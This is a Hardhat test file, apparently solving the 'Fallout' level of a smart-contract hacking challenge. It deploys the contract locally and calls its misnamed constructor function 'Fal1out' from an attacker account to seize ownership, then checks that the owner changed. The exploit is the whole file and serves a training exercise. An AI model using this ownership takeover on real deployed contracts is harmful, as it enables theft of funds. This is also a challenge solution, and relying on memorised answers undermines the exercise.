const { expect } = require("chai");
const { ethers } = require("hardhat");

/**
Reclama la propiedad del contrato a continuación para completar este nivel.
 */

describe("Fallout", function () {
  before("Deploy", async function () {
    [this.contrato, this.attack] = await hre.ethers.getSigners();
    const Fallout = await ethers.getContractFactory("Fallout");
    this.fall = await Fallout.deploy();
    await this.fall.deployed();

    this.c_otro = await this.fall.connect(this.attack);
  });

  it("Ataque", async function() {
    const owner = await this.fall.owner();

    await this.c_otro.Fal1out({ value: ethers.utils.parseEther("0.0000000000000001") })

    const owner2 = await this.c_otro.owner();

    expect(owner).to.not.equal(owner2);
  });

});
